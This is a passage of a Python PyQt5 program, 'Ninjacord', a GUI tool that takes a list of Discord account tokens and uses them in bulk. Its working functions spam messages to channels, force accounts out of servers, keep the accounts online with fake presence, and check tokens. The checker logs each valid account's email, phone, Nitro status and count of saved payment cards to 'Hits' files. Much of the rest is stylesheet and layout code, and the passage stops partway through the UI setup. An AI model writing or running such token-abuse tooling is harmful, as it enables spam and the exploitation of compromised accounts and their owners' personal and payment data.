######################### QT LIB #########################
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QFileDialog
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
######################### Pasif #########################
import time
import websocket, json, win32api
import os, time, threading, requests, datetime, random
import base64
from colorama import Fore


class Ui_ninjacord( QtWidgets.QMainWindow ):
    signal_Screen = pyqtSignal(str)    
    signal_Screen2 = pyqtSignal(str)
    def __init__(self):
        super().__init__()
        self.setupUi()
        self.starting = False
        self.tokens = []
        self.signal_Screen.connect(self.tablo_yazdir)
        self.signal_Screen2.connect(self.tablo2_yazdir)
        self.selectcord.currentIndexChanged.connect(self.ankarapavyon)
        self.playingtype.currentIndexChanged.connect(self.mamipavyon)

        ###################################################
        self.label_6.setVisible(False)
        self.label_5.setVisible(False)
        self.label_4.setVisible(False)
        self.setstatus.setVisible(False)
        self.playingtype.setVisible(False)
        self.playingname.setVisible(False)
        self.label_7.setVisible(False)
        self.twitchurl.setVisible(False)
        self.label_8.setVisible(False)
        self.spinBox.setVisible(False)
        self.channelid.setVisible(False)
        self.label_9.setVisible(False)


    def calistir(self):
        self.starting = True
        self.main()

    def durdur(self):
        self.starting = False
        self.signal_Screen2.emit('[+] Task Stopped !')
    
    def mamipavyon(self):
        self.selected_type = self.playingtype.currentText()

        if self.selected_type == 'STREAMING':
            self.label_7.setVisible(True)
            self.twitchurl.setVisible(True)
            self.label_4.setGeometry(QtCore.QRect(26, 270, 71, 20))
            self.setstatus.setGeometry(QtCore.QRect(90, 270, 161, 22))
            self.label_3.setGeometry(QtCore.QRect(40, 320, 71, 20))
            self.selectcord.setGeometry(QtCore.QRect(90, 320, 161, 22))

        else:
            self.label_7.setVisible(False)
            self.twitchurl.setVisible(False)
            self.label_4.setGeometry(QtCore.QRect(26, 240, 71, 20))
            self.setstatus.setGeometry(QtCore.QRect(90, 240, 161, 22))
            self.label_3.setGeometry(QtCore.QRect(40, 290, 71, 20))
            self.selectcord.setGeometry(QtCore.QRect(90, 290, 161, 22))

    def ankarapavyon(self):
        selected_item = self.selectcord.currentText()
        self.signal_Screen2.emit(f"SELECTED METHOD : {selected_item}")

        if selected_item == 'MESSAGE SPAM':
            self.label.setVisible(False)
            self.label_2.setVisible(True)
            self.label_4.setVisible(False)
            self.label_5.setVisible(False)
            self.label_6.setVisible(False)
            self.label_7.setVisible(False)
            self.label_8.setVisible(True)
            self.label_9.setVisible(True)

            self.messageid.setVisible(True)
            self.spinBox.setVisible(True)
            self.serverid.setVisible(False)
            self.channelid.setVisible(True)
            self.setstatus.setVisible(False)
            self.playingtype.setVisible(False)
            self.playingname.setVisible(False)
            self.twitchurl.setVisible(False)

            self.label.setGeometry(QtCore.QRect(20, 180, 61, 20))
            self.label_2.setGeometry(QtCore.QRect(24, 210, 61, 20))
            self.label_3.setGeometry(QtCore.QRect(30, 280, 61, 20))
            self.selectcord.setGeometry(QtCore.QRect(80, 280, 161, 22))

        elif selected_item == 'SERVER JOINER [ NOT WORK ]':
            self.label_8.setVisible(False)
            self.spinBox.setVisible(False)
            self.label.setVisible(False)
            self.serverid.setVisible(False)
            self.label_2.setVisible(False)
            self.messageid.setVisible(False)
            self.channelid.setVisible(False)
            self.label_6.setVisible(False)
            self.label_9.setVisible(False)
            self.playingname.setVisible(False)
            self.label_5.setVisible(False)
            self.playingtype.setVisible(False)
            self.label_7.setVisible(False)
            self.twitchurl.setVisible(False)
            self.label_4.setVisible(False)
            self.setstatus.setVisible(False)
            self.selectcord.setGeometry(QtCore.QRect(80, 180, 161, 20))
            self.label_3.setGeometry(QtCore.QRect(30, 180, 61, 20))

        elif selected_item == 'SERVER LEAVER':
            self.label.setVisible(True)
            self.label_2.setVisible(False)
            self.label_4.setVisible(False)
            self.label_5.setVisible(False)
            self.label_6.setVisible(False)
            self.label_7.setVisible(False)
            self.label_8.setVisible(False)
            self.label_9.setVisible(False)

            self.spinBox.setVisible(False)
            self.messageid.setVisible(False)
            self.channelid.setVisible(False)
            self.serverid.setVisible(True)
            self.setstatus.setVisible(False)
            self.playingtype.setVisible(False)
            self.playingname.setVisible(False)
            self.twitchurl.setVisible(False)

            self.label_3.setGeometry(QtCore.QRect(30, 210, 61, 20))
            self.selectcord.setGeometry(QtCore.QRect(80, 210, 161, 22))

        elif selected_item == 'TOKEN CHECKER':
            self.label.setVisible(False)
            self.label_2.setVisible(False)
            self.label_4.setVisible(False)
            self.label_5.setVisible(False)
            self.label_6.setVisible(False)
            self.label_7.setVisible(False)
            self.label_8.setVisible(False)
            self.label_9.setVisible(False)

            self.spinBox.setVisible(False)
            self.messageid.setVisible(False)
            self.serverid.setVisible(False)
            self.channelid.setVisible(False)
            self.setstatus.setVisible(False)
            self.playingtype.setVisible(False)
            self.playingname.setVisible(False)
            self.twitchurl.setVisible(False)

            self.label_3.setGeometry(QtCore.QRect(30, 180, 61, 20))
            self.selectcord.setGeometry(QtCore.QRect(80, 180, 161, 20))

        elif selected_item == 'TOKEN ONLINER':
            self.label.setVisible(False)
            self.label_2.setVisible(False)
            self.label_4.setVisible(True)
            self.label_5.setVisible(True)
            self.label_6.setVisible(True)
            self.label_7.setVisible(False)
            self.label_8.setVisible(False)
            self.label_9.setVisible(False)

            self.spinBox.setVisible(False)
            self.messageid.setVisible(False)
            self.serverid.setVisible(False)
            self.channelid.setVisible(False)
            self.setstatus.setVisible(True)
            self.playingtype.setVisible(True)
            self.playingname.setVisible(True)
            self.twitchurl.setVisible(False)
            
            self.label_3.setGeometry(QtCore.QRect(40, 290, 71, 20))
            self.label_4.setGeometry(QtCore.QRect(26, 240, 71, 20))
            self.label_5.setGeometry(QtCore.QRect(15, 210, 71, 20))
            self.label_6.setGeometry(QtCore.QRect(12, 180, 71, 20))
            self.playingname.setGeometry(QtCore.QRect(90, 180, 161, 22))
            self.playingtype.setGeometry(QtCore.QRect(90, 210, 161, 22))
            self.setstatus.setGeometry(QtCore.QRect(90, 240, 161, 22))
            self.selectcord.setGeometry(QtCore.QRect(90, 290, 161, 22))

            self.playingtype.setCurrentText("")

    def loadtoken(self):
        self.tokens = []

        path, _ = QFileDialog.getOpenFileName(None, 'Ninjacord - Select Token List', '', '*.txt')

        if path:
            with open(path, 'r', encoding = 'UTF-8') as f:
                for l in f:
                    self.tokens.append(l.strip())
            
            self.signal_Screen2.emit('[+] Token Loaded !')

    def tokencheck(self, token):
        headers = {
            'authorization': token,
            'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
            'x-discord-locale': 'tr'
        }

        response = requests.get('https://discord.com/api/v9/users/@me/affinities/users', headers=headers)

        if response.status_code == 200:
            response2 = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            username = response2.json()['username']
            disc = response2.json()['discriminator']
            country = response2.json()['locale'].upper()
            nitro = response2.json()['premium_type']
            email = response2.json()['email']
            phone = response2.json()['phone']

            if nitro == 0:
                nitro = 'No'

            else:
                nitro = 'Yes'

            response2 = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers=headers)
            guilds = response2.text.count('id')

            response3 = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers)
            cc = response3.text.count('brand')

            self.signal_Screen.emit(f'[HIT] - {token} - Nick : {username}#{disc} - Country : {country} - Nitro : {nitro} - Email : {email} - Phone : {phone} - Guilds : {guilds} - CC Count : {cc}')
            with open(f'{self.resultsyol}/Hits_Tokens.txt', 'a') as file:
                file.write(f'{token} - Nick : {username}#{disc} - Country : {country} - Nitro : {nitro} - Email : {email} - Phone : {phone} - Guilds : {guilds} - CC Count : {cc}\n')
                
        elif 'Unauthorized' in response.text:
            self.signal_Screen.emit(f'[BAD] - {token}')

        elif 'You need to verify' in response.text:
            self.signal_Screen.emit(f'[2FAC] {token}')
            with open(f'{self.resultsyol}/2Factor_Tokens.txt', 'a') as file:
                file.write(f'{token}\n')

    def tokenonliner(self, token):
        if self.selected_type == 'PLAYING':
            self.gamejson = {
                "name": self.playingname.text(),
                "type": 0,
            }

        elif self.selected_type == 'STREAMING':
            self.gamejson = {
                "name": self.playingname.text(),
                "type": 1,
                "url": self.twitchurl.text()
            }

        elif self.selected_type == 'LISTENING':
            self.gamejson = {
                "name": self.playingname.text(),
                "type": 2
            }

        elif self.selected_type == 'WATCHING':
            self.gamejson = {
                "name": self.playingname.text(),
                "type": 3
            }

        ws = websocket.WebSocket()
        ws.connect("wss://gateway.discord.gg/?encoding=json&v=9")
        response = ws.recv()
        event = json.loads(response)
        heartbeat_interval = int(event["d"]["heartbeat_interval"]) / 1000

        ws.send(
            json.dumps(
                {
                    "op": 2,
                    "d": {
                        "token": token,
                        "properties": {
                            "$os": sys.platform,
                            "$browser": "RTB",
                            "$device": f"{sys.platform} Device",
                        },
                        "presence": {
                            "game": self.gamejson,
                            "status": self.setstatus.currentText().lower(),
                            "since": 0,
                            "activities": [],
                            "afk": False,
                        },
                    },
                    "s": None,
                "t": None,
                }
            )
        )

        self.signal_Screen.emit(f'[+] - {token} - Token Onlined - {self.selected_type} - {self.playingname.text()} - {self.setstatus.currentText()}')

        while True:
            heartbeatJSON = {
                "op": 1, 
                "token": token, 
                "d": "null"
            }
            ws.send(json.dumps(heartbeatJSON))
            time.sleep(heartbeat_interval)
    
    def messagespam(self, token):
        for i in range(999):
            sayilar = '0123456789'
            nonce = "".join(random.choices(sayilar, k = 19))

            headers = {
                'authorization': token,
                'content-type': 'application/json',
                'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
                'x-discord-locale': 'tr',
            }

            json = {
                'content': self.messageid.text(),
                'nonce': nonce,
                'tts': False,
                'flags': 0,
            }

            response = requests.post(f'https://discord.com/api/v9/channels/{self.channelid.text()}/messages', headers=headers, json=json)
            
            if 200 == response.status_code:
                self.signal_Screen.emit(f'[+] Sent the message - {self.channelid.text()} Sent the this channel - Message : {self.messageid.text()}')

            else:
                self.signal_Screen.emit(f'[-] The message could not be sent !')
                print(response.text)

            time.sleep(int(self.spinBox.text()))

            if self.starting == False:
                break

    def serverleaver(self, token):
        id2 = self.serverid.text()

        headers = {
            'authorization': token,
            'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
            'x-discord-locale': 'tr'
        }

        data = '{"lurking":false}'

        response = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{id2}', headers=headers, data=data)
        
        if response.status_code == 204:
            self.signal_Screen.emit(f'[+] {id2} Exited the server.')

        else:
            self.signal_Screen.emit(f'[-] {id2} Could not log out of the server !')

    def worker(self, tokens):
        for token in tokens:
            token = str(token).strip()

            if self.islemmethodu == 'MESSAGE SPAM':
                threading.Thread(target = self.messagespam, args = (token,)).start()

            elif self.islemmethodu == 'TOKEN CHECKER':
                threading.Thread(target = self.tokencheck, args = (token,)).start()

            elif self.islemmethodu == 'SERVER LEAVER':
                threading.Thread(target = self.serverleaver, args = (token,)).start()

            elif self.islemmethodu == 'TOKEN ONLINER':
                threading.Thread(target = self.tokenonliner, args = (token,)).start()

            if self.starting == False:
                break

    def main(self):
        if self.tokens != []:
            self.starting = True

            if os.path.exists('Results'):
                pass

            else:
                os.mkdir('Results')

            saat = datetime.datetime.now().strftime("%H.%M.%S")
            tarih = datetime.date.today().strftime("%d.%m.%Y")

            self.resultsyol = f'Results/[{tarih}] [{saat}] Results'
            os.mkdir(self.resultsyol)

            self.islemmethodu = self.selectcord.currentText()
            self.signal_Screen2.emit(f'Starting -> {self.islemmethodu}')

            QTableWidget.clear(self.tablo1)
            self.tablo1.setRowCount(1)
            self.tablo1.setColumnCount(1)
            self.tablo1.setHorizontalHeaderLabels(['Tools Log'])

            QTableWidget.clear(self.tablo2)
            self.tablo2.setRowCount(1)
            self.tablo2.setColumnCount(1)
            self.tablo2.setHorizontalHeaderLabels(['Console Log'])

            threads = []

            for i in range(5):
                sliced_tokens = self.tokens[int(len(self.tokens) / 5 * i): int(len(self.tokens)/ 5* (i+1))]
                t = threading.Thread(target = self.worker, args = (sliced_tokens,))
                threads.append(t)
                t.start()

            for t in threads:
                t.join()

            self.signal_Screen2.emit('[+] Task Completed !')

        else:
            self.signal_Screen2.emit('[-] Plase Select Token List !')


    def sayfakapat(self):
        self.close()
        os._exit(0)

    def sayfakuluct(self):
        self.showMinimized()  

    def back(self): 
        self.ana_sayfa.show()
        self.close()

    def tablo_yazdir(self, text):
        self.tablo1.insertRow(0)
        new_item = QtWidgets.QTableWidgetItem(text)
        new_item.setFlags(Qt.ItemIsSelectable | Qt.ItemIsEnabled)
        self.tablo1.setItem(0, 0, new_item)

    def tablo2_yazdir(self, text):
        self.tablo2.insertRow(0)
        new_item2 = QtWidgets.QTableWidgetItem(text)
        new_item2.setFlags(Qt.ItemIsSelectable | Qt.ItemIsEnabled)
        self.tablo2.setItem(0, 0, new_item2)


    def setupUi(self):
        self.setWindowFlag(Qt.FramelessWindowHint)
        self.setObjectName("ninjacord")
        self.resize(1500, 900)
        self.setMinimumSize(QtCore.QSize(1500, 900))
        self.setMaximumSize(QtCore.QSize(1500, 900))
        self.setStyleSheet("\n"
"QMainWindow {\n"
"    background-color:#1e1d23;\n"
"}\n"
"QDialog {\n"
"    background-color:#1e1d23;\n"
"}\n"
"QColorDialog {\n"
"    background-color:#1e1d23;\n"
"}\n"
"QTextEdit {\n"
"    background-color:#1e1d23;\n"
"    color: #a9b7c6;\n"
"}\n"
"QPlainTextEdit {\n"
"    selection-background-color:#23dae9;\n"
"    background-color:#1e1d23;\n"
"    border-style: solid;\n"
"    border-top-color: transparent;\n"
"    border-right-color: transparent;\n"
"    border-left-color: transparent;\n"
"    border-bottom-color: transparent;\n"
"    border-width: 1px;\n"
"    color: #a9b7c6;\n"
"}\n"
"\n"
"QToolButton {\n"
"    border-radius: 15px;\n"
"    border-top-color: transparent;\n"
"    border-right-color: transparent;\n"
"    border-left-color: transparent;\n"
"    border-bottom-color: #23dae9;\n"
"    border-bottom-width: 1px;\n"
"    border-radius: 15px;\n"
"    color: #a9b7c6;\n"
"    padding: 2px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"\n"
"\n"
"QToolButton:hover{\n"
"    border-width: 2px; border-radius: 15px;\n"
"    border-radius: 15px;\n"
"    border-color: #23dae9;\n"
"\n"
"    border-style: solid;\n"
"    color: #FFFFFF;\n"
"    padding-bottom: 1px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"\n"
"\n"
"\n"
"\n"
"QPushButton{\n"
"    border-style: solid;\n"
"\n"
"    border-style: solid;\n"
"    color: #a9b7c6;\n"
"    padding: 2px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QPushButton::default{\n"
"    border-style: inset;\n"
"\n"
"    color: #a9b7c6;\n"
"    padding: 2px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QPushButton:hover{\n"
"    border-style: solid;\n"
"\n"
"    border-style: solid;\n"
"    color: #a9b7c6;\n"
"    padding-bottom: 2px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QPushButton:pressed{\n"
"    border-style: solid;\n"
"\n"
"    border-style: solid;\n"
"    color: #a9b7c6;\n"
"    padding-bottom: 1px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QPushButton:disabled{\n"
"    border-style: solid;\n"
"\n"
"    border-style: solid;\n"
"    color: #a9b7c6;\n"
"    padding-bottom: 1px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"QLineEdit {\n"
"    border-width: 2px; border-radius: 15px;\n"
"    border-color: #23dae9;\n"
"    border-style: inset;\n"
"    padding: 0 8px;\n"
"    color: #FFF;\n"
"    background:rgb(36,36,36);\n"
"    selection-background-color:#23dae9;\n"
"    selection-color: #FFFFFF;\n"
"}\n"
"\n"
"QLineEdit:hover{\n"
"    border: 2px solid #23dae9\n"
"}\n"
"\n"
"QLineEdit:focus{\n"
"    border:2px solid #23dae9\n"
"}\n"
"\n"
"\n"
"QLabel {\n"
"    color: #a9b7c6;\n"
"}\n"
"QLCDNumber {\n"
"    color: #23dae9;\n"
"}\n"
"QProgressBar {\n"
"    text-align: center;\n"
"    color: rgb(240, 240, 240);\n"
"    border-width: 1px; \n"
"    border-radius: 10px;\n"
"    border-color: rgb(58, 58, 58);\n"
"    border-style: inset;\n"
"    background-color:#1e1d23;\n"
"}\n"
"QProgressBar::chunk {\n"
"    background-color: #23dae9;\n"
"    border-radius: 5px;\n"
"}\n"
"QMenuBar {\n"
"    background-color: #1e1d23;\n"
"}\n"
"QMenuBar::item {\n"
"    color: #a9b7c6;\n"
"      spacing: 3px;\n"
"      padding: 1px 4px;\n"
"      background: #1e1d23;\n"
"}\n"
"\n"
"QMenuBar::item:selected {\n"
"      background:#1e1d23;\n"
"    color: #FFFFFF;\n"
"}\n"
"QMenu::item:selected {\n"
"    border-style: solid;\n"
"    border-top-color: transparent;\n"
"    border-right-color: transparent;\n"
"    border-left-color: #23dae9;\n"
"    border-bottom-color: transparent;\n"
"    border-left-width: 2px;\n"
"    color: #FFFFFF;\n"
"    padding-left:15px;\n"
"    padding-top:4px;\n"
"    padding-bottom:4px;\n"
"    padding-right:7px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QMenu::item {\n"
"    border-style: solid;\n"
"    border-top-color: transparent;\n"
"    border-right-color: transparent;\n"
"    border-left-color: transparent;\n"
"    border-bottom-color: transparent;\n"
"    border-bottom-width: 1px;\n"
"    border-style: solid;\n"
"    color: #a9b7c6;\n"
"    padding-left:17px;\n"
"    padding-top:4px;\n"
"    padding-bottom:4px;\n"
"    padding-right:7px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QMenu{\n"
"    background-color:#1e1d23;\n"
"}\n"
"QTabWidget {\n"
"    color:rgb(0,0,0);\n"
"    background-color:#1e1d23;\n"
"}\n"
"QTabWidget::pane {\n"
"        border-color: rgb(77,77,77);\n"
"        background-color:#1e1d23;\n"
"        border-style: solid;\n"
"        border-width: 1px;\n"
"        border-radius: 6px;\n"
"}\n"
"QTabBar::tab {\n"
"    border-style: solid;\n"
"    border-top-color: transparent;\n"
"    border-right-color: transparent;\n"
"    border-left-color: transparent;\n"
"    border-bottom-color: transparent;\n"
"    border-bottom-width: 1px;\n"
"    border-style: solid;\n"
"    color: #808086;\n"
"    padding: 3px;\n"
"    margin-left:3px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QTabBar::tab:selected, QTabBar::tab:last:selected, QTabBar::tab:hover {\n"
"      border-style: solid;\n"
"    border-top-color: transparent;\n"
"    border-right-color: transparent;\n"
"    border-left-color: transparent;\n"
"    border-bottom-color: #23dae9;\n"
"    border-bottom-width: 2px;\n"
"    border-style: solid;\n"
"    color: #FFFFFF;\n"
"    padding-left: 3px;\n"
"    padding-bottom: 2px;\n"
"    margin-left:3px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"\n"
"QCheckBox {\n"
"    color: #a9b7c6;\n"
"    padding: 2px;\n"
"}\n"
"QCheckBox:disabled {\n"
"    color: #808086;\n"
"    padding: 2px;\n"
"}\n"
"\n"
"QCheckBox:hover {\n"
"    border-radius:4px;\n"
"    border-style:solid;\n"
"    padding-left: 1px;\n"
"    padding-right: 1px;\n"
"    padding-bottom: 1px;\n"
"    padding-top: 1px;\n"
"    border-width:1px;\n"
"    border-color: rgb(87, 97, 106);\n"
"    background-color:#1e1d23;\n"
"}\n"
"QCheckBox::indicator:checked {\n"
"\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-width: 1px;\n"
"    border-color: #23dae9;\n"
"    color: #a9b7c6;\n"
"    background-color: #23dae9;\n"
"}\n"
"QCheckBox::indicator:unchecked {\n"
"\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-width: 1px;\n"
"    border-color: #23dae9;\n"
"    color: #a9b7c6;\n"
"    background-color: transparent;\n"
"}\n"
"QRadioButton {\n"
"    color: #a9b7c6;\n"
"    background-color: #1e1d23;\n"
"    padding: 1px;\n"
"}\n"
"QRadioButton::indicator:checked {\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-radius:5px;\n"
"    border-width: 1px;\n"
"    border-color: #23dae9;\n"
"    color: #a9b7c6;\n"
"    background-color: #23dae9;\n"
"}\n"
"QRadioButton::indicator:!checked {\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-radius:5px;\n"
"    border-width: 1px;\n"
"    border-color: #23dae9;\n"
"    color: #a9b7c6;\n"
"    background-color: transparent;\n"
"}\n"
"QStatusBar {\n"
"    color:#027f7f;\n"
"}\n"
"QSpinBox {\n"
"    color: #a9b7c6;    \n"
"    background-color: #1e1d23;\n"
"}\n"
"QDoubleSpinBox {\n"
"    color: #a9b7c6;    \n"
"    background-color: #1e1d23;\n"
"}\n"
"QTimeEdit {\n"
"    color: #a9b7c6;    \n"
"    background-color: #1e1d23;\n"
"}\n"
"QDateTimeEdit {\n"
"    color: #a9b7c6;    \n"
"    background-color: #1e1d23;\n"
"}\n"
"QDateEdit {\n"
"    color: #a9b7c6;    \n"
"    background-color: #1e1d23;\n"
"}\n"
"QComboBox {\n"
"    color: #a9b7c6;    \n"
"    background: #1e1d23;\n"
"}\n"
"QComboBox:editable {\n"
"    background: #1e1d23;\n"
"    color: #a9b7c6;\n"
"    selection-background-color: #1e1d23;\n"
"}\n"
"QComboBox QAbstractItemView {\n"
"    color: #a9b7c6;    \n"
"    background: #1e1d23;\n"
"    selection-color: #FFFFFF;\n"
"    selection-background-color: #1e1d23;\n"
"}\n"
"QComboBox:!editable:on, QComboBox::drop-down:editable:on {\n"
"    color: #a9b7c6;    \n"
"    background: #1e1d23;\n"
"}\n"
"QFontComboBox {\n"
"    color: #a9b7c6;    \n"
"    background-color: #1e1d23;\n"
"}\n"
"QToolBox {\n"
"    color: #a9b7c6;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QToolBox::tab {\n"
"    color: #a9b7c6;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QToolBox::tab:selected {\n"
"    color: #FFFFFF;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QScrollArea {\n"
"    color: #FFFFFF;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QSlider::groove:horizontal {\n"
"    height: 5px;\n"
"    background: #23dae9;\n"
"}\n"
"QSlider::groove:vertical {\n"
"    width: 5px;\n"
"    background: #23dae9;\n"
"}\n"
"QSlider::handle:horizontal {\n"
"    background: qlineargradient(x1:0, y1:0, x2:1, y2:1, stop:0 #b4b4b4, stop:1 #8f8f8f);\n"
"    border: 1px solid #5c5c5c;\n"
"    width: 14px;\n"
"    margin: -5px 0;\n"
"    border-radius: 7px;\n"
"}\n"
"QSlider::handle:vertical {\n"
"    background: qlineargradient(x1:1, y1:1, x2:0, y2:0, stop:0 #b4b4b4, stop:1 #8f8f8f);\n"
"    border: 1px solid #5c5c5c;\n"
"    height: 14px;\n"
"    margin: 0 -5px;\n"
"    border-radius: 7px;\n"
"}\n"
"QSlider::add-page:horizontal {\n"
"    background: white;\n"
"}\n"
"QSlider::add-page:vertical {\n"
"    background: white;\n"
"}\n"
"QSlider::sub-page:horizontal {\n"
"    background: #23dae9;\n"
"}\n"
"QSlider::sub-page:vertical {\n"
"    background: #23dae9;\n"
"}")
        self.centralwidget = QtWidgets.QWidget()
        self.centralwidget.setObjectName("centralwidget")
        self.back_to_menu_button = QtWidgets.QPushButton(self.centralwidget)
        self.back_to_menu_button.setGeometry(QtCore.QRect(10, 10, 31, 31))
        font = QtGui.QFont()
        font.setPointSize(15)
        self.back_to_menu_button.setFont(font)
        self.back_to_menu_button.setStyleSheet("QPushButton{\n"
"  border-style: solid;\n"
"  border-style: solid;\n"
"  color: #a9b7c6;\n"
"  padding: 2px;\n"
"  background-color: #1e1d23;\n"
"}\n"
"QPushButton::default{\n"
"  border-style: inset;\n"
"  border-width: 1px;\n"
"  color: #a9b7c6;\n"
"  padding: 2px;\n"
"  background-color: #1e1d23;\n"
"}\n"
"QPushButton:hover{\n"
"  border-style: solid;\n"
"  border-top-color: #23dae9;\n"
"  border-right-color: #23dae9;\n"
"  border-left-color: #23dae9;\n"
"  border-bottom-color: #23dae9;\n"
"  border-bottom-width: 1px;\n"
"  border-style: solid;\n"
"  color: #23dae9;\n"
"  padding-bottom: 2px;\n"
"  background-color: #1e1d23;\n"
"}\n"
"QPushButton:pressed{\n"
"  border-style: solid;\n"
"  border-top-color: #23dae9;\n"
"  border-right-color: #23dae9;\n"
"  border-left-color: #23dae9;\n"
"  border-bottom-color: #23dae9;\n"
"  border-bottom-width: 2px;\n"
"  border-style: solid;\n"
"  color: #23dae9;\n"
"  padding-bottom: 1px;\n"
"  background-color: #1e1d23;\n"
"}\n"
"QPushButton:disabled{\n"
"  border-style: solid;\n"
"  border-top-color: #23dae9;\n"
"  border-right-color: #23dae9;\n"
"  border-left-color: #23dae9;\n"
"  border-bottom-color: #808086;\n"
"  border-bottom-width: 2px;\n"
"  border-style: solid;\n"
"  color: #808086;\n"
"  padding-bottom: 1px;\n"
"  background-color: #1e1d23;\n"
"}")
        self.back_to_menu_button.setObjectName("back_to_menu_button")
        self.buyult = QtWidgets.QRadioButton(self.centralwidget)
        self.buyult.setGeometry(QtCore.QRect(1450, 10, 16, 17))
        self.buyult.setStyleSheet("QRadioButton::indicator:checked {\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-radius:5px;\n"
"    border-width: 1px;\n"
"    border-color: rgb(0, 255, 0);\n"
"    color: rgb(0, 255, 0);\n"
"    background-color: rgb(0, 255, 0);\n"
"}\n"
"\n"
"QRadioButton::indicator:!checked {\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-radius:5px;\n"
"    border-width: 1px;\n"
"    border-color: rgb(0, 255, 0);\n"
"    color: rgb(0, 255, 0);\n"
"    background-color: rgb(0, 255, 0);\n"
"}")
        self.buyult.setText("")
        self.buyult.setObjectName("buyult")
        self.kucult = QtWidgets.QRadioButton(self.centralwidget)
        self.kucult.setGeometry(QtCore.QRect(1430, 10, 16, 17))
        self.kucult.setStyleSheet("QRadioButton::indicator:checked {\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-radius:5px;\n"
"    border-width: 1px;\n"
"    border-color:  rgb(255, 255, 0);\n"
"    color:  rgb(255, 255, 0);\n"
"    background-color: rgb(255, 255, 0);\n"
"}\n"
"\n"
"QRadioButton::indicator:!checked {\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-radius:5px;\n"
"    border-width: 1px;\n"
"    border-color:  rgb(255, 255, 0);\n"
"    color:  rgb(255, 255, 0);\n"
"    background-color:  rgb(255, 255, 0);\n"
"}")
        self.kucult.setText("")
        self.kucult.setObjectName("kucult")
        self.kapat = QtWidgets.QRadioButton(self.centralwidget)
        self.kapat.setGeometry(QtCore.QRect(1470, 10, 16, 17))
        self.kapat.setStyleSheet("QRadioButton::indicator:checked {\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-radius:5px;\n"
"    border-width: 1px;\n"
"    border-color: rgb(208, 0, 0);\n"
"    color: rgb(208, 0, 0);\n"
"    background-color: rgb(208, 0, 0);\n"
"}\n"
"\n"
"QRadioButton::indicator:!checked {\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-radius:5px;\n"
"    border-width: 1px;\n"
"    border-color: rgb(208, 0, 0);\n"
"    color: rgb(208, 0, 0);\n"
"    background-color: rgb(208, 0, 0);\n"
"}")
        self.kapat.setText("")
        self.kapat.setObjectName("kapat")
        self.panel = QtWidgets.QGroupBox(self.centralwidget)
        self.panel.setGeometry(QtCore.QRect(20, 60, 281, 811))
        self.panel.setTitle("")
        self.panel.setObjectName("panel")
        self.startbutton = QtWidgets.QPushButton(self.panel)
        self.startbutton.setGeometry(QtCore.QRect(40, 20, 201, 41))
        self.startbutton.setStyleSheet("\n"
"border-radius: 15px;\n"
"background-color:rgb(0, 85, 0)")
        self.startbutton.setObjectName("startbutton")
        self.inputbutton = QtWidgets.QPushButton(self.panel)
        self.inputbutton.setGeometry(QtCore.QRect(40, 70, 201, 41))
        self.inputbutton.setStyleSheet("\n"
"border-radius: 15px;\n"
"background-color:rgb(170, 0, 0)")
        self.inputbutton.setObjectName("inputbutton")
        self.loadbutton = QtWidgets.QPushButton(self.panel)
        self.loadbutton.setGeometry(QtCore.QRect(40, 120, 201, 41))
        self.loadbutton.setStyleSheet("\n"
"border-radius: 15px;\n"
"background-color:rgb(0, 85, 127)")
        self.loadbutton.setObjectName("loadbutton")
        self.selectcord = QtWidgets.QComboBox(self.panel)
        self.selectcord.setGeometry(QtCore.QRect(80, 250, 161, 22))
        self.selectcord.setObjectName("selectcord")
        self.selectcord.addItem("")
        self.selectcord.setItemText(0, "")
        self.selectcord.addItem("")
        self.selectcord.addItem("")
        self.selectcord.addItem("")
        self.selectcord.addItem("")
        self.selectcord.addItem("")
        self.playingname = QtWidgets.QLineEdit(self.panel)
        self.playingname.setGeometry(QtCore.QRect(90, 180, 161, 22))
        self.playingname.setObjectName("playingname")
        self.label_6 = QtWidgets.QLabel(self.panel)
        self.label_6.setGeometry(QtCore.QRect(12, 180, 71, 20))
        self.label_6.setObjectName("label_6")
